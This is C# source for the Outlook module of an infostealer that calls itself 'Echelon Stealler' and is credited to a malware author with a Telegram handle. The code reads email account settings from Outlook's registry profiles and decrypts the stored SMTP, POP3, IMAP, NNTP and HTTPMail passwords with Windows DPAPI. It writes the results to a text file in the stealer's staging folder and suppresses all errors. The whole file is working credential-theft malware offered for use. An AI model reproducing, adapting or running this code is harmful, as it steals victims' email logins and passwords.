///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Echelon
{
    class Outlook
    {
        public static string OutlookDir = "\\EmailClients\\Outlook";
        public static void GrabOutlook(string Echelon_Dir)
        {
            string data = "";

            string[] RegDirecories = new string[]
                {
                "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
                };

            string[] mailClients = new string[]
{
                "SMTP Email Address","SMTP Server","POP3 Server",
                "POP3 User Name","SMTP User Name","NNTP Email Address",
                "NNTP User Name","NNTP Server","IMAP Server","IMAP User Name",
                "Email","HTTP User","HTTP Server URL","POP3 User",
                "IMAP User", "HTTPMail User Name","HTTPMail Server",
                "SMTP User","POP3 Password2","IMAP Password2",
                "NNTP Password2","HTTPMail Password2","SMTP Password2",
                "POP3 Password","IMAP Password","NNTP Password",
                "HTTPMail Password","SMTP Password"
};

            foreach (string dir in RegDirecories)
            {
                data += $"{Get(dir, mailClients)}";
            }

            try
            {
                Directory.CreateDirectory(Echelon_Dir + OutlookDir);
                File.WriteAllText(Echelon_Dir + OutlookDir + "\\Outlook.txt", data + "\r\n");
            }
            catch { }
        }

        static string Get(string path, string[] clients)
        {
            Regex smptClient = new Regex(@"^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$");
            Regex mailClient = new Regex(@"^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$");

            string data = "";

            try
            {
                foreach (string client in clients)
                {
                    try
                    {
                        object value = GetInfoFromReg(path, client);

                        if (value != null && client.Contains("Password") && !client.Contains("2"))
                        {
                            data += $"{client}: {Decrypt((byte[])value)}\r\n";
                        }

                        else
                        {
                            if (smptClient.IsMatch(value.ToString()) || mailClient.IsMatch(value.ToString()))
                            {
                                data += $"{client}: {value}\r\n";
                            }

                            else
                            {
                                data += $"{client}: {Encoding.UTF8.GetString((byte[])value).Replace(Convert.ToChar(0).ToString(), "")}\r\n";
                            }
                        }
                    }
                    catch
                    {
                    }
                }

                //
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(path, false);
                string[] Clients = key.GetSubKeyNames();

                foreach (string client in Clients)
                {
                    data += $"{Get($"{path}\\{client}", clients)}";
                }
            }
            catch
            {

            }


            return data;
        }

        public static object GetInfoFromReg(string path, string valueName)
        {
            object value = null;

            try
            {
                Microsoft.Win32.RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(path, false);
                value = registryKey.GetValue(valueName);
                registryKey.Close();
            }
            catch
            { }

            return value;
        }

        public static string Decrypt(byte[] encrypted)
        {
            try
            {
                byte[] decoded = new byte[encrypted.Length - 1];
                Buffer.BlockCopy(encrypted, 1, decoded, 0, encrypted.Length - 1);

                return Encoding.UTF8.GetString(System.Security.Cryptography.ProtectedData.Unprotect(decoded, null, System.Security.Cryptography.DataProtectionScope.CurrentUser)).Replace(Convert.ToChar(0).ToString(), "");

            }
            catch
            { }

            return "null";
        }
    }
}
